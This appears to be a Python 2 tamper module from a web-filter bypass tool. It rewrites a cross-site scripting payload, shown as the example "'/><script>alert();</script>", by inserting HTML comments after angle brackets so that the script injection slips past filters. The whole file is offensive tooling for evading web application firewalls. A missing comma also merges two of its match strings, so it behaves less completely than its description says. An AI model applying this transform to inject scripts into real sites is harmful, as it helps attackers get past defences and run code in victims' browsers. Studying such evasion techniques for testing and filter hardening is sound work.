__example_payload__ = "'/><script>alert();</script>"
__type__ = "placing HTML comments before and after the word 'script' or after the presence of '<'/'>'"


def tamper(payload, **kwargs):
    retval = ""
    html_comment = "<!--%-->"
    snipes = ("<", "/>", ">" "script")
    if not any(s in payload for s in snipes):
        # no point in running it through if there's nothing useful in it
        return payload
    for char in payload:
        if any(s in char for s in snipes):
            retval += "{}{}".format(char, html_comment)
        else:
            retval += char
    return retval


print tamper(__example_payload__)